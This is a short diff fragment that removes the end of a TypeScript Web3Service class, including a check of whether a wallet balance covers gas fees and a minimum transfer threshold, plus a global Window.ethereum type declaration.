-    // Use a much smaller minimum threshold - 0.000001 instead of 0.00001
-    const minThreshold = ethers.parseUnits("0.000001", "ether");
-    if (remainingAfterGas < minThreshold) {
-      return {
-        sufficient: false,
-        details: `Balance too low for meaningful transfer. Available: ${balanceFormatted} ${currency}, Gas cost: ${gasCostFormatted} ${currency}, Remaining: ${remainingFormatted} ${currency}. Please ensure you have more ${currency} to cover both gas fees and transfer amount.`
-      };
-    }
-    
-    return {
-      sufficient: true,
-      details: `Sufficient balance available. Balance: ${balanceFormatted} ${currency}, Gas cost: ${gasCostFormatted} ${currency}, Available for transfer: ${remainingFormatted} ${currency}`
-    };
-  }
-}
-
-export const web3Service = new Web3Service();
-
-// Extend Window interface for TypeScript
-declare global {
-  interface Window {
-    ethereum?: any;
-  }
-}
